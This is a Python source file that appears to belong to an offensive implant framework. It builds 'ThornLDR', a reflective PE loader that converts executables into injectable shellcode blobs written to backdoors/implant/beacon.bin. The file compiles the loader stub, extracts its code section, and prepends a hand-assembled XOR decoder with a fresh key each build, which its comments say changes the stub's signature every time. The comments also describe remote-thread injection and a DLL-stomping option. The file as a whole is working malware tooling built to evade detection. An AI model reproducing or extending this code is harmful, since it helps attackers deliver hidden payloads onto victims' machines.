# bab/loader.py — ThornLDR: custom reflective PE loader
#
# Replaces Donut as the PE→shellcode converter.  Produces a THORNLDR blob:
#
#   [0..8]   "THORNLDR" magic
#   [8..12]  pe_offset  u32 LE  — byte offset from blob[0] to PE MZ header
#   [12..16] pe_size    u32 LE  — raw PE file size
#   [16..]   loader stub (.text of thornldr.exe, position-independent)
#   [pe_offset..] raw PE bytes
#
# The stager decrypts the blob from the ZIP and injects it; the loader stub
# runs inside the target process, maps the PE, and calls its entry point.

import os
import struct
from pathlib import Path

from .config import ROOT, IMPLANT_OUT
from .ui     import section, ok, err, info
from .cargo  import run_cmd, CARGO_ENV, _find_cargo

# ── Paths ─────────────────────────────────────────────────────────────────────
LOADER_DIR    = ROOT / "tools" / "thornldr"
LOADER_EXE    = LOADER_DIR / "target" / "x86_64-pc-windows-gnu" / "release" / "thornldr.exe"
CACHED_STUB   = ROOT / "tools" / "thornldr_stub.bin"

# Blob header prefix (8 bytes, occupies the same space as the old "THORNLDR" magic):
#   [0..2]  JMP SHORT +14  (EB 0E) — jumps over the header to the stub at byte 16,
#           so CreateRemoteThread can be pointed at blob[0] and immediately reach code.
#   [2..8]  zero padding (never executed due to JMP)
#
# pe_offset and pe_size follow at blob[8..16], matching what loader_main expects
# after the call/pop gadget resolves blob_base = blob[0].
BLOB_HEADER_PREFIX = b'\xEB\x0E' + b'\x00' * 6   # JMP +14, 6-byte pad = 8 bytes total
MAGIC = BLOB_HEADER_PREFIX   # keep the same name so assemble_blob needs no other changes

# ── Compilation ───────────────────────────────────────────────────────────────
def compile_thornldr(features: list | None = None) -> bool:
    """Build the thornldr Rust crate and produce thornldr.exe.

    Pass a list of Cargo feature names to enable optional loader behaviour,
    e.g. features=["module_stomp"] to activate the PEB-walk DLL stomper.
    An empty list or None compiles the baseline (plain VirtualAlloc) loader.
    """
    section("Compile ThornLDR stub")
    if not LOADER_DIR.exists():
        err(f"ThornLDR source not found: {LOADER_DIR}")
        return False
    try:
        cargo = _find_cargo()
    except FileNotFoundError as e:
        err(str(e))
        return False
    cmd = [cargo, "build", "--release", "--target=x86_64-pc-windows-gnu"]
    if features:
        cmd += ["--features", ",".join(features)]
        info(f"Loader features: {', '.join(features)}")
    if not run_cmd(cmd, cwd=LOADER_DIR, env=CARGO_ENV):
        err("ThornLDR compile failed.")
        return False
    if not LOADER_EXE.exists():
        err(f"Expected EXE not found: {LOADER_EXE}")
        return False
    ok(f"thornldr.exe  ({LOADER_EXE.stat().st_size // 1024} KB)")
    return True

# ── .text extraction ──────────────────────────────────────────────────────────
def _extract_pe_text_section(exe_path: Path) -> bytes | None:
    """
    Parse the PE/COFF file directly and return the stub bytes.

    The stub is .text followed by any remaining sections (e.g. .data containing
    RIP-relative constants), padded with zeros to preserve the exact VA spacing
    between sections.  Without this, RIP-relative references from .text into
    .data point to the wrong memory (the PE header) at runtime and the PEB walk
    always fails — kernel32 is never found, the loader returns immediately, and
    the injected thread dies without ever reaching the payload entry point.

    llvm-objcopy --output-target=binary mishandles COFF PE files with high VMAs,
    so we parse the section table ourselves.
    """
    import struct as _struct
    data = exe_path.read_bytes()
    if data[:2] != b"MZ":
        err("Not a PE file (no MZ magic)")
        return None
    pe_off = _struct.unpack_from("<I", data, 0x3c)[0]
    if data[pe_off:pe_off+4] != b"PE\x00\x00":
        err("PE signature not found")
        return None
    nsec        = _struct.unpack_from("<H", data, pe_off + 6)[0]
    opthdr_sz   = _struct.unpack_from("<H", data, pe_off + 20)[0]
    sec_tbl_off = pe_off + 24 + opthdr_sz

    # Collect all sections so we can preserve VA gaps between them.
    sections = []
    for i in range(nsec):
        off  = sec_tbl_off + i * 40
        name = data[off:off + 8].rstrip(b"\x00").decode("ascii", errors="replace")
        vsize, vaddr, rawsz, rawoff = _struct.unpack_from("<IIII", data, off + 8)
        sections.append((name, vaddr, vsize, rawsz, rawoff))

    # Find .text — it defines VA base 0 for the stub.
    text = next((s for s in sections if s[0] == ".text"), None)
    if text is None:
        err(".text section not found in PE")
        return None

    text_name, text_vaddr, text_vsize, text_rawsz, text_rawoff = text
    text_size = text_vsize if text_vsize else text_rawsz
    stub = bytearray(data[text_rawoff : text_rawoff + text_size])

    # Append every non-discarded section that follows .text in VA space,
    # padding the gap between sections with zeros so RIP-relative offsets remain valid.
    for name, vaddr, vsize, rawsz, rawoff in sections:
        if name == ".text":
            continue
        if vaddr <= text_vaddr:
            continue  # overlapping or preceding — skip
        size = vsize if vsize else rawsz
        if size == 0:
            continue
        # VA offset from .text base to this section.
        section_offset = vaddr - text_vaddr
        # Extend stub with zeros to cover the gap.
        if section_offset > len(stub):
            stub += bytes(section_offset - len(stub))
        stub += data[rawoff : rawoff + size]

    return bytes(stub)


def extract_stub() -> bytes | None:
    """Extract the .text section of thornldr.exe as raw bytes."""
    section("Extract stub .text section")

    stub = _extract_pe_text_section(LOADER_EXE)
    if stub is None:
        return None

    # Sanity check: first byte must be 0xE8 (CALL rel32 — the entry trampoline)
    if stub[0] != 0xE8:
        err(f"Unexpected stub entry byte 0x{stub[0]:02x} — expected 0xE8 (CALL).\n"
            f"  loader_entry may not be first in .text. Check link.x.")
        return None

    # Cache for future builds
    CACHED_STUB.parent.mkdir(parents=True, exist_ok=True)
    CACHED_STUB.write_bytes(stub)
    ok(f"Stub: {len(stub):,} bytes  (cached → tools/thornldr_stub.bin)")
    return stub

# ── Per-build XOR decoder ─────────────────────────────────────────────────────
#
# A small position-independent decoder is prepended to the blob payload region.
# It runs first, XOR-decodes the ThornLDR stub + PE in-place, then jumps to
# the now-decoded stub.  Because the key is generated fresh each build, the
# encrypted bytes (and therefore the static ThornLDR stub signature) differ
# every time.
#
# Decoder layout (40 bytes, starts at blob[16] = where EB 0E jumps):
#
#   E8 00 00 00 00          call next       ; CALL/POP to find our own address
#   58                      pop rax         ; rax = blob[16]+5 after call
#   48 83 E8 15             sub rax, 0x15   ; rax = blob_base  (0x15 = 5+16)
#   8B 48 08                mov ecx,[rax+8] ; ecx = pe_offset (u32 from header)
#   44 8B 40 0C             mov r8d,[rax+12]; r8d = pe_size   (u32 from header)
#   44 01 C1                add ecx, r8d    ; ecx = pe_offset + pe_size
#   83 E9 38                sub ecx, 0x38   ; ecx = decode_len (0x38 = 16+40)
#   48 8D 70 38             lea rsi,[rax+56]; rsi = start of encrypted region
#   56                      push rsi        ; save stub entry address for ret
#   B2 <KEY>                mov dl, KEY     ; XOR key (patched per build)
#   30 16                   xor [rsi], dl   ; ─┐
#   48 FF C6                inc rsi          ;  │ decode loop (9 bytes, jnz -9)
#   FF C9                   dec ecx          ;  │
#   75 F7                   jnz -9           ; ─┘
#   C3                      ret             ; jump to decoded ThornLDR stub
#
# After decoding, loader_entry runs.  Its CALL/POP gives:
#   rcx = blob_base + 16 + 40 + 5 = blob_base + 61
# so stub[9] (the sub rcx, imm8 immediate) is patched from 0x15 to 0x3D (61)
# before encryption.

_DECODER_SIZE  = 40
_DECODER_NN    = 16 + _DECODER_SIZE   # = 56 = 0x38  (offset of encrypted region)
_STUB_SUB_OFF  = 9                     # byte offset of imm8 in loader_entry's sub rcx
_STUB_SUB_NEW  = 21 + _DECODER_SIZE   # = 61 = 0x3D  (corrected sub value)

def _build_decoder(xor_key: int) -> bytes:
    assert 1 <= xor_key <= 255
    nn = _DECODER_NN  # 0x38 — fits in signed imm8 and disp8
    d = bytes([
        0xE8, 0x00, 0x00, 0x00, 0x00,   # call next
        0x58,                             # pop rax
        0x48, 0x83, 0xE8, 0x15,          # sub rax, 0x15
        0x8B, 0x48, 0x08,                # mov ecx, [rax+8]
        0x44, 0x8B, 0x40, 0x0C,          # mov r8d, [rax+12]
        0x44, 0x01, 0xC1,                # add ecx, r8d
        0x83, 0xE9, nn,                  # sub ecx, NN
        0x48, 0x8D, 0x70, nn,            # lea rsi, [rax+NN]
        0x56,                             # push rsi
        0xB2, xor_key,                   # mov dl, KEY
        0x30, 0x16,                      # xor [rsi], dl
        0x48, 0xFF, 0xC6,                # inc rsi
        0xFF, 0xC9,                      # dec ecx
        0x75, 0xF7,                      # jnz -9
        0xC3,                            # ret
    ])
    assert len(d) == _DECODER_SIZE, f"decoder size mismatch: {len(d)}"
    return d

# ── Blob assembly ─────────────────────────────────────────────────────────────
def assemble_blob(stub: bytes, pe_bytes: bytes) -> bytes:
    """
    Build a THORNLDR blob with a per-build XOR decoder.

    Layout:
      header (16 B) | decoder (40 B) | XOR-encrypted [ stub (padded) | PE ]

    A random 1-byte XOR key is generated each call so the encrypted payload
    bytes (including the ThornLDR stub signature) differ on every build.
    The decoder decrypts in-place before jumping to the stub.
    """
    # Random non-zero key — XOR with 0 would be a no-op
    xor_key = 0
    while xor_key == 0:
        xor_key = os.urandom(1)[0]

    decoder = _build_decoder(xor_key)

    # Pad stub to 16-byte boundary within the encrypted region
    pad         = (16 - (len(stub) % 16)) % 16
    stub_padded = bytearray(stub + bytes(pad))

    # Patch loader_entry's sub rcx, imm8: stub[9] 0x15 → 0x3D
    # This adjusts the CALL/POP base-finder for the decoder's extra 40 bytes.
    stub_padded[_STUB_SUB_OFF] = _STUB_SUB_NEW

    # XOR-encrypt stub + PE
    payload   = bytes(stub_padded) + pe_bytes
    encrypted = bytes(b ^ xor_key for b in payload)

    header_size = len(MAGIC) + 4 + 4   # 8 + 4 + 4 = 16
    pe_offset   = header_size + _DECODER_SIZE + len(stub_padded)

    blob  = MAGIC
    blob += struct.pack("<I", pe_offset)
    blob += struct.pack("<I", len(pe_bytes))
    blob += decoder
    blob += encrypted
    return blob

# ── Public entry point ────────────────────────────────────────────────────────
def thornldr_implant(pe_path: Path, features: list | None = None) -> bool:
    """
    Convert a PE to a THORNLDR shellcode blob and write it to
    backdoors/implant/beacon.bin.

    features: optional list of Cargo feature names for the loader, e.g.
              ["module_stomp"].  None / [] builds the baseline loader.
    """
    section("ThornLDR → shellcode")

    if not pe_path.exists():
        err(f"PE not found: {pe_path}")
        return False

    pe_bytes = pe_path.read_bytes()

    # Validate MZ header
    if pe_bytes[:2] != b"MZ":
        err(f"Not a valid PE file: {pe_path}")
        return False

    # ── Resolve stub (cached or freshly compiled) ─────────────────────────────
    # The cache is always bypassed here because the caller (server_build.py)
    # already called rebuild_stub() with the correct features before we get here.
    stub = None
    if CACHED_STUB.exists():
        stub = CACHED_STUB.read_bytes()
        info(f"Using cached stub  ({len(stub):,} bytes)")

    if not stub:
        if not compile_thornldr(features):
            return False
        stub = extract_stub()
        if stub is None:
            return False

    # ── Assemble and write ────────────────────────────────────────────────────
    blob = assemble_blob(stub, pe_bytes)

    IMPLANT_OUT.mkdir(parents=True, exist_ok=True)
    out = IMPLANT_OUT / "beacon.bin"
    out.write_bytes(blob)
    return True

def rebuild_stub(features: list | None = None) -> bool:
    """Force recompile of the thornldr stub, bypassing the cache.

    features: optional list of Cargo feature names, e.g. ["module_stomp"].
    """
    section("Rebuild ThornLDR stub")
    if CACHED_STUB.exists():
        CACHED_STUB.unlink()
        info("Cleared cached stub")
    if not compile_thornldr(features):
        return False
    stub = extract_stub()
    return stub is not None
